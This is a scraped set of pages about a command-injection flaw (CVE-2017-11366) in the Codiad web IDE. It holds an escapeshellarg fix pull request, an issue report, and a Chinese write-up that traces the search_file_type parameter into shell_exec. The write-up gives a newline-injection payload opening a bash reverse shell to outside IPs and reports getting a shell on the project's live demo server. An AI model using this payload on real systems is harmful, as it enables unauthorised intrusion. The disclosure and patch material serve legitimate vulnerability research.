=== Content from github.com_935bbb70_20250125_041156.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fpull%2F1013%2Fcommits%2Fb3645b4c6718cef6de7003f41aafe7bfcc0395d1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fpull%2F1013%2Fcommits%2Fb3645b4c6718cef6de7003f41aafe7bfcc0395d1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fpull_requests%2Fshow%2Fcommits&source=header-repo&source_repo=Codiad%2FCodiad)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Sep 8, 2023. It is now read-only.

[Codiad](/Codiad)
/
**[Codiad](/Codiad/Codiad)**
Public archive

* [Notifications](/login?return_to=%2FCodiad%2FCodiad) You must be signed in to change notification settings
* [Fork
  700](/login?return_to=%2FCodiad%2FCodiad)
* [Star
   2.8k](/login?return_to=%2FCodiad%2FCodiad)

* [Code](/Codiad/Codiad)
* [Issues
  197](/Codiad/Codiad/issues)
* [Pull requests
  10](/Codiad/Codiad/pulls)
* [Discussions](/Codiad/Codiad/discussions)
* [Actions](/Codiad/Codiad/actions)
* [Wiki](/Codiad/Codiad/wiki)
* [Security](/Codiad/Codiad/security)
* [Insights](/Codiad/Codiad/pulse)

Additional navigation options

* [Code](/Codiad/Codiad)
* [Issues](/Codiad/Codiad/issues)
* [Pull requests](/Codiad/Codiad/pulls)
* [Discussions](/Codiad/Codiad/discussions)
* [Actions](/Codiad/Codiad/actions)
* [Wiki](/Codiad/Codiad/wiki)
* [Security](/Codiad/Codiad/security)
* [Insights](/Codiad/Codiad/pulse)

# Escaping shell arguments #1013

 Merged

[daeks](/daeks)
merged 1 commit into
[Codiad:master](/Codiad/Codiad/tree/master "Codiad/Codiad:master")
from
[cheiff:master](/cheiff/Codiad/tree/master "cheiff/Codiad:master")

Jul 25, 2017

[Conversation
1](/Codiad/Codiad/pull/1013)
[Commits
1](/Codiad/Codiad/pull/1013/commits)
[Checks
0](/Codiad/Codiad/pull/1013/checks)
[Files changed](/Codiad/Codiad/pull/1013/files)

 Merged

# [Escaping shell arguments](#top) #1013

 Changes from **all commits**

Commits

[Show all changes

1 commit](/Codiad/Codiad/pull/1013/files)
Select commit

[`b3645b4`
Escaping shell arguments

Jul 25, 2017](/Codiad/Codiad/pull/1013/commits/b3645b4c6718cef6de7003f41aafe7bfcc0395d1)

**File filter**

### Filter by extension

Filter by extension

.php
(1)

All 1 file type selected

---

Viewed files

[Clear filters](/Codiad/Codiad/pull/1013/commits/b3645b4c6718cef6de7003f41aafe7bfcc0395d1)

 **Conversations**

Failed to load comments.  Retry

 Loading

 **Jump to**

Jump to file

Failed to load files.  Retry

 Loading

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Show whitespace

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Escaping shell arguments

* Loading branch information

sphinx
committed
Jul 25, 2017

commit b3645b4c6718cef6de7003f41aafe7bfcc0395d1

## There are no files selected for viewing

6 changes: 3 additions & 3 deletions

6
[components/filemanager/class.filemanager.php](#diff-74b5adfb2a90e807ea3d02f29f158231f2e6f6314866f58db74efc5e55c29f90 "components/filemanager/class.filemanager.php")

Show comments

[View file](/cheiff/Codiad/blob/b3645b4c6718cef6de7003f41aafe7bfcc0395d1/components/filemanager/class.filemanager.php)
Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -57,7 +57,7 @@ public function \_\_construct($get, $post, $files) |
|  |  | $this->rel\_path .= "/"; |
|  |  | } |
|  |  | if (!empty($get['query'])) { |
|  |  | $this->query = $get['query']; |
|  |  | $this->query = escapeshellarg($get['query']); |
|  |  | } |
|  |  | if (!empty($get['options'])) { |
|  |  | $this->foptions = $get['options']; |
| Expand All | | @@ -71,10 +71,10 @@ public function \_\_construct($get, $post, $files) |
|  |  | } |
|  |  | // Search |
|  |  | if (!empty($post['search\_string'])) { |
|  |  | $this->search\_string = $post['search\_string']; |
|  |  | $this->search\_string = escapeshellarg($post['search\_string']); |
|  |  | } |
|  |  | if (!empty($post['search\_file\_type'])) { |
|  |  | $this->search\_file\_type = $post['search\_file\_type']; |
|  |  | $this->search\_file\_type = escapeshellarg($post['search\_file\_type']); |
|  |  | } |
|  |  | // Create |
|  |  | if (!empty($get['type'])) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_735a609c_20250125_041155.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fpull%2F1013)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fpull%2F1013)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=Codiad%2FCodiad)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Sep 8, 2023. It is now read-only.

[Codiad](/Codiad)
/
**[Codiad](/Codiad/Codiad)**
Public archive

* [Notifications](/login?return_to=%2FCodiad%2FCodiad) You must be signed in to change notification settings
* [Fork
  700](/login?return_to=%2FCodiad%2FCodiad)
* [Star
   2.8k](/login?return_to=%2FCodiad%2FCodiad)

* [Code](/Codiad/Codiad)
* [Issues
  197](/Codiad/Codiad/issues)
* [Pull requests
  10](/Codiad/Codiad/pulls)
* [Discussions](/Codiad/Codiad/discussions)
* [Actions](/Codiad/Codiad/actions)
* [Wiki](/Codiad/Codiad/wiki)
* [Security](/Codiad/Codiad/security)
* [Insights](/Codiad/Codiad/pulse)

Additional navigation options

* [Code](/Codiad/Codiad)
* [Issues](/Codiad/Codiad/issues)
* [Pull requests](/Codiad/Codiad/pulls)
* [Discussions](/Codiad/Codiad/discussions)
* [Actions](/Codiad/Codiad/actions)
* [Wiki](/Codiad/Codiad/wiki)
* [Security](/Codiad/Codiad/security)
* [Insights](/Codiad/Codiad/pulse)

# Escaping shell arguments #1013

 Merged

[daeks](/daeks)
merged 1 commit into
[Codiad:master](/Codiad/Codiad/tree/master "Codiad/Codiad:master")
from
[cheiff:master](/cheiff/Codiad/tree/master "cheiff/Codiad:master")

Jul 25, 2017

 Merged

# [Escaping shell arguments](#top) #1013

[daeks](/daeks)
merged 1 commit into
[Codiad:master](/Codiad/Codiad/tree/master "Codiad/Codiad:master")
from
[cheiff:master](/cheiff/Codiad/tree/master "cheiff/Codiad:master")

Jul 25, 2017

[Conversation
1](/Codiad/Codiad/pull/1013)
[Commits
1](/Codiad/Codiad/pull/1013/commits)
[Checks
0](/Codiad/Codiad/pull/1013/checks)
[Files changed](/Codiad/Codiad/pull/1013/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![cheiff](https://avatars.githubusercontent.com/u/2758555?s=60&v=4)](/cheiff)

Copy link

Member

### @cheiff **[cheiff](/cheiff)** commented [Jul 25, 2017](#issue-245441779)

Please [@daeks](https://github.com/daeks) , can you merge this?

See [#1011](https://github.com/Codiad/Codiad/issues/1011)

Sorry, something went wrong.

All reactions

`[Escaping shell arguments](/Codiad/Codiad/pull/1013/commits/b3645b4c6718cef6de7003f41aafe7bfcc0395d1 "Escaping shell arguments")`

`[b3645b4](/Codiad/Codiad/pull/1013/commits/b3645b4c6718cef6de7003f41aafe7bfcc0395d1)`

[![@daeks](https://avatars.githubusercontent.com/u/3989440?s=40&u=2bc91649b1ff357df106585eaf7a752fa8370bac&v=4)](/daeks)
[daeks](/daeks)
merged commit [`ca5089e`](/Codiad/Codiad/commit/ca5089eeba42d16ce3a7f86be628ac7750780111)
into
Codiad:master

[Jul 25, 2017](https://github.com/Codiad/Codiad/pull/1013#event-1178486171)

[![@cheiff](https://avatars.githubusercontent.com/u/2758555?s=80&v=4)](/cheiff)

Copy link

Member

Author

### **[cheiff](/cheiff)** commented [Jul 25, 2017](#issuecomment-317828497) via email • edited Loading

| Thanks |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fpull%2F1013).

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@cheiff](https://avatars.githubusercontent.com/u/2758555?s=52&v=4)](/cheiff) [![@daeks](https://avatars.githubusercontent.com/u/3989440?s=52&v=4)](/daeks)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from link.jianshu.com_d48ce1f5_20250126_055246.html ===


[![Nav logo](https://cdn2.jianshu.io/assets/web/nav-logo-4c7bbafe27adc892f3046e6978459bac.png)](/)

[写文章](/writer#/) [注册](/sign_up)
[登录](/sign_in)

* ![](https://www.jianshu.com/bn-static/assets/web/banner/3d8a3a524ad770.svg)
* [首页](/)
* [下载App](/apps?utm_medium=desktop&utm_source=navbar-apps)
* [会员](/vips)
* [IT技术](/techareas)



=== Content from github.com_5a49ff97_20250125_041154.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fissues%2F1011)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCodiad%2FCodiad%2Fissues%2F1011)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=Codiad%2FCodiad)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Sep 8, 2023. It is now read-only.

[Codiad](/Codiad)
/
**[Codiad](/Codiad/Codiad)**
Public archive

* [Notifications](/login?return_to=%2FCodiad%2FCodiad) You must be signed in to change notification settings
* [Fork
  700](/login?return_to=%2FCodiad%2FCodiad)
* [Star
   2.8k](/login?return_to=%2FCodiad%2FCodiad)

* [Code](/Codiad/Codiad)
* [Issues
  197](/Codiad/Codiad/issues)
* [Pull requests
  10](/Codiad/Codiad/pulls)
* [Discussions](/Codiad/Codiad/discussions)
* [Actions](/Codiad/Codiad/actions)
* [Wiki](/Codiad/Codiad/wiki)
* [Security](/Codiad/Codiad/security)
* [Insights](/Codiad/Codiad/pulse)

Additional navigation options

* [Code](/Codiad/Codiad)
* [Issues](/Codiad/Codiad/issues)
* [Pull requests](/Codiad/Codiad/pulls)
* [Discussions](/Codiad/Codiad/discussions)
* [Actions](/Codiad/Codiad/actions)
* [Wiki](/Codiad/Codiad/wiki)
* [Security](/Codiad/Codiad/security)
* [Insights](/Codiad/Codiad/pulse)

This repository has been archived by the owner on Sep 8, 2023. It is now read-only.

# Security issues, Remote Command Execution Vulnerability #1011

[Jump to bottom](#comment-composer-heading)Copy link[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Security issues, Remote Command Execution Vulnerability](#top)#1011Copy link[![@WangYihang](https://avatars.githubusercontent.com/u/16917636?u=1d6d29e3194e666d922770512e7abd968c9b00a5&v=4&size=80)](/WangYihang)
## Description

[![@WangYihang](https://avatars.githubusercontent.com/u/16917636?u=1d6d29e3194e666d922770512e7abd968c9b00a5&v=4&size=48)](/WangYihang)[WangYihang](https://github.com/WangYihang)opened [on Jul 25, 2017](https://github.com/Codiad/Codiad/issues/1011#issue-245300232)

Hacker can get demo.codiad.com server privileges by the vulnerability, I have send you an email about that, but did not receive a reply. more details , please contact my mailbox

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from link.jianshu.com_923ad5bb_20250126_055240.html ===


[![Nav logo](https://cdn2.jianshu.io/assets/web/nav-logo-4c7bbafe27adc892f3046e6978459bac.png)](/)

[写文章](/writer#/) [注册](/sign_up)
[登录](/sign_in)

* ![](https://www.jianshu.com/bn-static/assets/web/banner/c82bae21b5981a.svg)
* [首页](/)
* [下载App](/apps?utm_medium=desktop&utm_source=navbar-apps)
* [会员](/vips)
* [IT技术](/techareas)



=== Content from www.jianshu.com_afe59711_20250125_041153.html ===
[登录](/sign_in)[注册](/sign_up)[写文章](/writer)[首页](/)[下载APP](/apps?utm_medium=desktop&utm_source=navbar-apps)[会员](/vips)[IT技术](/techareas)
# [CVE-2017-11366]Codiad 漏洞挖掘笔记 (0x01) [环境搭建以及远程命令执行]

[王一航](/u/bf30f18c872c)关注赞赏支持
# [CVE-2017-11366]Codiad 漏洞挖掘笔记 (0x01) [环境搭建以及远程命令执行]

---

#### 本文首发地址 :

> [https://xianzhi.aliyun.com/forum/read/2000.html](https://link.jianshu.com?t=https://xianzhi.aliyun.com/forum/read/2000.html)

先知技术社区独家发表本文，如需要转载，请先联系先知技术社区授权；未经授权请勿转载。

先知技术社区投稿邮箱：[Aliyun\_xianzhi@service.alibaba.com](https://link.jianshu.com?t=mailto:Aliyun_xianzhi@service.alibaba.com)

---

#### 仓库 :

```
https://github.com/Codiad/Codiad

```

---

#### 环境搭建 :

```
####基础环境 :
---------------------------------------------------------------------------
PHP 7.0.20-2 (cli) (built: Jun 14 2017 05:30:04) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies
    with Zend OPcache v7.0.20-2, Copyright (c) 1999-2017, by Zend Technologies
---------------------------------------------------------------------------
Server version: Apache/2.4.25 (Debian)
Server built:   2017-06-20T19:31:51

#### PHP扩展
apt install php7.0-mbstring
apt install php7.0-zip

#### PHP 配置
vim /etc/php/7.0/apache2/php.ini
zend.multibyte = On

####应用环境 :
---------------------------------------------------------------------------
cd /var/www/html
git clone https://github.com/Codiad/Codiad.git
cd Codiad
cp config.example.php config.php
chmod o+w workspace
chmod o+w plugins
chmod o+w data
chmod o+w themes
chmod o+w config.php

```
```
问题 :
1. 注意到这里在配置环境的时候需要给 config.php 写权限
隐隐感觉到可能会存在问题...
2. 其他可以写的目录也可能为写入 shell 提供便利

```
```
#### 创建项目
这里笔者将项目根目录放置于 : /root/pentest/
需要为这个目录赋予写权限
chmod o+w /root/pentest
在这个文件夹下面创建一个 php 文件
index.php
<?php phpinfo();?>

```

![]()

image.png

---

#### 开始测试 :

###### 1. 首先验证一下之前在 XMAN 中发现的命令执行漏洞是否可用

```
找到文件搜索功能 :

```

![]()

image.png
```
我们已经知道这个目录下面是存在文件 : index.php
<?php phpinfo();?>
直接搜索 phpinfo

```

抓包分析 :

![]()

image.png

![]()

image.png

![]()

image.png

---

白盒分析 :

```
# 填坑

```

![]()

image.png

![]()

image.png

![]()

image.png
```
// ./components/filemanager/controller.php
    public function search()
    {
        if (!function_exists('shell_exec')) {
            $this->status = "error";
            $this->message = "Shell_exec() Command Not Enabled.";
        } else {
            if ($_GET['type'] == 1) {
                $this->path = WORKSPACE;
            }
            $input = str_replace('"', '', $this->search_string);
            $input = preg_quote($input);
            $output = shell_exec('find -L ' . $this->path . ' -iregex  ".*' . $this->search_file_type  . '" -type f | xargs grep -i -I -n -R -H "' . $input . '"');
            $output_arr = explode("\n", $output);
            $return = array();
            foreach ($output_arr as $line) {
                $data = explode(":", $line);
                $da = array();
                if (count($data) > 2) {
                    $da['line'] = $data[1];
                    $da['file'] = str_replace($this->path, '', $data[0]);
                    $da['result'] = str_replace($this->root, '', $data[0]);
                    $da['string'] = str_replace($data[0] . ":" . $data[1] . ':', '', $line);
                    $return[] = $da;
                }
            }
            if (count($return)==0) {
                $this->status = "error";
                $this->message = "No Results Returned";
            } else {
                $this->status = "success";
                $this->data = '"index":' . json_encode($return);
            }
        }
        $this->respond();
    }

```
```
// 重点在这句 , shell_exec 执行了系统命令 , 而且参数是我们可控的
$output = shell_exec('find -L ' . $this->path . ' -iregex  ".*' . $this->search_file_type  . '" -type f | xargs grep -i -I -n -R -H "' . $input . '"');
// 可控参数有 :
// $this->path
// $this->search_file_type
// $input
根据这三个参数向上溯源可以发现 :

```

![]()

image.png

![]()

image.png

![]()

image.png

![]()

image.png

可以很容易就发现 , $this->search\_file\_type 这个参数是直接从 POST 参数中取出来的, 并没有经过任何过滤

这样一个命令执行漏洞就已经产生了

我们来查一下 shell\_exec 函数的细节 :

![]()

image.png

通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。

而通过 shell 环境执行命令是可以使用换行符号的 , 这样很容易就可以执行我们的任意命令

```
# 构造命令 :
find -L /home/pentest -iregex  ".*SniperOJ"
/bin/bash -c 'sh -i >& /dev/tcp/120.24.215.80/8888 0>&1'
grep "SniperOJ" -type f | xargs grep -i -I -n -R -H "php"

也就是 search_file_type =
SniperOJ"%0a%2Fbin%2Fbash+-c+%27sh+-i+>%26+%2Fdev%2Ftcp%2F8.8.8.8%2F8888+0>%261%27%0agrep%20"SniperOJ

```

![]()

image.png

记得之前测试 Codiad 的官方 Demo 的时候 , 发现在创建项目的时候是可以直接使用 git 仓库进行创建的

所以说 , Demo所在的服务器是必然可以访问互联网的

那么我们接下来如果对官方 Demo 进行测试 , 应该也是可以成功的

接下来我们测试一下官方 Demo

![]()

image.png

![]()

image.png

![]()

image.png

![]()

image.png

![]()

image.png

![]()

image.png

成功 get shell

![]()

image.png

![]()

image.png

---

黑盒测试问题汇总 :

```
1. 安装的时候似乎可以任意制定项目路径 , 但是安装完成后就不能随意指定项目路径了 , 被允许的路径有 : /home/ 以及 /var/www/
2. 官方 Demo 中虽然不允许输入绝对路径创建项目 , 但是可以使用 git 来拉取远程的仓库
3. 官方 Demo 访问 http://demo.codiad.com/i/202118236174/workspace 则会 500 错误

```
#### POC

```
ip="8.8.8.8";
port="8888";
